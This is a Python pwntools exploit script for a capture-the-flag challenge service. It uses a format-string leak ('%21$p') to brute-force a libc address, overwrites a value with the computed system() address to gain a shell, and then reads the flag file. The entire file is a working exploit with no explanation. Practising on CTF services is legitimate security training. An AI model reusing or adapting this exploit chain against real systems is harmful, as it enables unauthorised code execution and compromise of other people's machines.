#!/usr/bin/python3

from pwn import *
import random

#r = remote('localhost', 4001)
r = remote('eofqual.zoolab.org', 4001)
#context.log_level='debug'
def cont(title, c):
	r.sendafter('Continue?', 'y')
	r.sendlineafter('Give me title: ', title)
	r.sendlineafter('Give me content: ', c)

def randoohex(num):
    w = '0123456789abcdef'
    ret = ''
    for i in range(num):
        ret += w[ random.randint(0,15) ]
    
    return ret

# %21$p
# libc + 0x270b3
# 0x7fXXXXXXX0b3

while True:
    r = remote('eofqual.zoolab.org', 4001)
    
    qq = False
    libc = ''
    HEADER = '0x'
    a1 = '7f00'
    a2 = '0000'
    a3 = '0'
    a4 = '0b3'

    a = [a3, a2, a1]
    r.recvuntil('Conti')
    idx = 0
    
    for i in range(len(a)):
        while True:
            idx += 1
            try:
                r.sendafter('nue?', 'y', timeout=3)
                r.sendlineafter('Give me title: ', '%21$p', timeout=3)
                p1 = r.recvuntil('\nGive ', drop=True, timeout=3)

                if i == 0:
                    a[i] = hex(int(a[i], 16))[2:]
                else:
                    if i == 1:
                        a[i] = randoohex(4)
                    else:
                        a[i] = '7f' + randoohex(2)

                libc = HEADER + ''.join(a[::-1]) + a4
                
                print(idx, libc)
                r.sendlineafter('me content: ', libc, timeout=3)

                p2 = r.recvuntil('\nConti', drop=True, timeout=3)
            except EOFError:
                qq = True
                break
            
            if i == 0:
                if p1[-4:] == p2[-4:]:
                    print(a)
                    break
                else:
                    a[i] = hex(int(a[i], 16)+1)[2:]
            if i == 1:
                if p1[-8:] == p2[-8:]:
                    print(a)
                    break
            if i == 2:
                if p1[-12:] == p2[-12:]:
                    print(a)
                    break
        if qq:
            break
    if qq:
        continue
    libc = int(libc, 16) - 0x270b3
    system_ = libc + 0x55410
    r.sendafter('nue?', 'n')
    r.send(p64(system_))
    sleep(1)
    r.sendline('cat /home/`whoami`/flag')
    r.interactive()
    break
